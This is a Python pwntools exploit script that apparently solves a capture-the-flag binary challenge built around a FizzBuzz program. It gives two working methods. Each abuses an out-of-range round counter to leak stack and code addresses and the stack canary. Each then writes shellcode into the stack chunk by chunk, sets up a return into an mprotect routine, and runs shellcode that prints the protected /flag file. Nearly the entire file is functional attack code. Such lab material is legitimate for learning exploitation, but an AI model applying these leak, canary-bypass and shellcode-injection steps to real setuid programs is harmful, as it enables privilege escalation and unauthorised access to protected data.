import re
import sys
import pwn


pwn.context.arch = "amd64"
pwn.context.os = "linux"
pwn.context.terminal = ["tmux", "new-window"]


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def struct_offsets(base: int):

    def decorator(cls):
        current_offset = base
        for field_name in vars(cls):
            if field_name.startswith("__"):
                continue
            size = getattr(cls, field_name)
            if callable(size):
                continue
            if not isinstance(size, int):
                msg = f"Field '{field_name}' must be initialized with an integer size"
                raise ValueError(msg)
            setattr(cls, field_name, current_offset)
            current_offset += size
        return cls

    return decorator


@struct_offsets(base=0x20)
class Offsets:
    max_round = 4
    fizz_value = 16
    user_input = 24
    this_round = 4
    this_answer = 8
    last_printf = 8


if "gdb" in sys.argv:
    io = pwn.gdb.debug(
        find_challenge(),
        gdbscript="""
source /opt/gef/gef.py
# b *challenge+470
b *challenge+543
b *mprotect_stack+105
c
    """,
    )
else:
    io = pwn.process(find_challenge())


def method1(io):
    """reading canary"""
    critical_round = 5
    user_input_cap = Offsets.this_round - Offsets.user_input
    payload = bytearray(b"." * user_input_cap)
    payload += pwn.p32(-critical_round - 1, sign=1)  # this_round
    io.sendafter(b":", payload)
    io.recvuntil(b"Correct answer: ")
    assert io.recvline() == b"FizzBuzz\n"

    io.sendafter(b":", payload)
    io.recvuntil(b"Correct answer: ")
    if not (match := re.search(rb"\xfa\xff\xff\xff(.{6})", io.recvline())):
        pwn.error("Failed to find buffer address")

    user_input_16_addr = match.group(1) + b"\x00\x00"
    user_input_16_addr = pwn.u64(user_input_16_addr)
    user_input_00_addr = user_input_16_addr - 16
    pwn.success(f"Found buffer address: {user_input_00_addr:#x}")
    canary_addr = user_input_00_addr + Offsets.last_printf - Offsets.user_input + 16
    pwn.success(f"Found canary address: {canary_addr:#x}")
    return_addr = canary_addr + 16
    pwn.success(f"Found return address: {return_addr:#x}")

    payload += pwn.p64(return_addr)  # this_answer
    io.sendafter(b":", payload)
    io.recvuntil(b"Correct answer: ")
    if not (match := re.search(rb"(.{6})", io.recvline())):
        pwn.error("Failed to lea address")
    lea_land_addr = match.group(1) + b"\x00\x00"
    lea_land_addr = pwn.u64(lea_land_addr)
    pwn.success(f"Found lea address: {lea_land_addr:#x}")
    mem_land_addr = lea_land_addr - 0x159A + 0x1269
    pwn.success(f"Found mem address: {mem_land_addr:#x}")

    payload[-8:] = pwn.p64(canary_addr + 1)  # this_answer
    io.sendafter(b":", payload)
    io.recvuntil(b"Correct answer: ")
    if not (match := re.search(rb"(.{7})", io.recvline())):
        pwn.error("Failed to find canary")
    canary = b"\x00" + match.group(1)
    pwn.success(f"Found canary: {canary.hex()}")

    shellasm = pwn.shellcraft.cat("/flag") + pwn.shellcraft.exit(0)  # type: ignore
    shellcode: bytes = pwn.asm(shellasm)
    print(pwn.hexdump(shellcode))
    shellcode_start_addr = user_input_00_addr + 1
    shellcode_place_addr = user_input_00_addr + 0x100
    assert b"\x00" not in shellcode, "Shellcode contains null byte"

    for i in range(0, len(shellcode), 8):
        chunk = shellcode[i : i + 8]
        payload = [
            b"\x00",
            chunk.ljust(user_input_cap - 1, b"\x00"),
            pwn.p32(-critical_round - 1, sign=1),  # this_round
            pwn.p64(shellcode_start_addr),  # this_answer
            pwn.p64(shellcode_place_addr + i),  # last_printf
        ]
        payload = b"".join(payload)
        io.sendafter(b":", payload)
        io.recvuntil(b"Correct answer: ")

    payload = [
        b"\x00" * user_input_cap,
        pwn.p32(16),  # this_round
        pwn.p64(user_input_00_addr),  # this_answer
        pwn.p64(user_input_00_addr),  # last_printf
        pwn.p64(user_input_00_addr),  # padding
        canary,
        pwn.p64(mem_land_addr),  # saved rbp
        pwn.p64(mem_land_addr),  # return address
        pwn.p64(shellcode_place_addr),  # next return address
    ]
    payload = b"".join(payload)
    assert len(payload) <= 84, f"final payload too large: {len(payload)} > 84"
    io.sendafter(b":", payload)
    io.recvrepeat()


def method2(io):
    """direct address write"""
    critical_round = 5
    max_round = 16
    user_input_cap = Offsets.this_round - Offsets.user_input

    def read_chunk(addr: int) -> bytes:
        payload = [
            bytearray(b"." * user_input_cap),
            pwn.p32(-critical_round - 1, sign=1),  # this_round
            pwn.p64(addr),  # this_answer
        ]
        if not addr:
            payload.pop()
        payload = b"".join(payload)
        io.sendafter(b":", payload)
        io.recvuntil(b"Correct answer: ")
        return io.recvline()

    assert read_chunk(0) == b"FizzBuzz\n"

    if not (match := re.search(rb"\xfa\xff\xff\xff(.{6})", read_chunk(0))):
        pwn.error("Failed to find buffer address")

    user_input_16_addr = match.group(1) + b"\x00\x00"
    user_input_16_addr = pwn.u64(user_input_16_addr)
    user_input_00_addr = user_input_16_addr - 16
    pwn.success(f"Found buffer address: {user_input_00_addr:#x}")
    canary_addr = user_input_00_addr + Offsets.last_printf - Offsets.user_input + 16
    pwn.success(f"Found canary address: {canary_addr:#x}")
    return_addr = canary_addr + 16
    pwn.success(f"Found return address: {return_addr:#x}")

    def write_chunk(addr: int, data: bytes):
        buffer_available = user_input_cap - 1
        this_answer_addr = user_input_00_addr + 1
        assert len(data) <= buffer_available, "Data chunk too large"
        payload = [
            b"\x00",
            data.ljust(buffer_available, b"\x00"),
            pwn.p32(-critical_round - 1, sign=1),  # this_round
            pwn.p64(this_answer_addr),  # this_answer
            pwn.p64(addr),  # last_printf
        ]
        print(pwn.hexdump(payload))
        payload = b"".join(payload)
        io.sendafter(b":", payload)
        io.recvuntil(b"Correct answer: ")

    if not (match := re.search(rb"(.{6})", read_chunk(return_addr))):
        pwn.error("Failed to lea address")
    lea_land_addr = match.group(1) + b"\x00\x00"
    lea_land_addr = pwn.u64(lea_land_addr)
    pwn.success(f"Found lea address: {lea_land_addr:#x}")
    mprotect_addr = lea_land_addr - 0x159A + 0x1269
    pwn.success(f"Found mprotect address: {mprotect_addr:#x}")

    shellasm = pwn.shellcraft.cat("/flag") + pwn.shellcraft.exit(0)  # type: ignore
    shellcode: bytes = pwn.asm(shellasm)

    shellcode_place_addr = user_input_00_addr + 0x100
    write_chunk(return_addr, pwn.p64(mprotect_addr))
    write_chunk(return_addr + 8, pwn.p64(shellcode_place_addr))
    pwn.info(f"Placing shellcode at: {shellcode_place_addr:#x}")
    for i in range(0, len(shellcode), 8):
        chunk = shellcode[i : i + 8]
        assert b"\x00" not in chunk, "shellcode contains null byte"
        write_chunk(shellcode_place_addr + i, chunk)

    payload = [
        b"\x00" * user_input_cap,
        pwn.p32(max_round),  # this_round
    ]
    payload = b"".join(payload)
    io.sendafter(b":", payload)
    io.recvrepeat()


with tee(io) as io:
    # method1(io)
    method2(io)
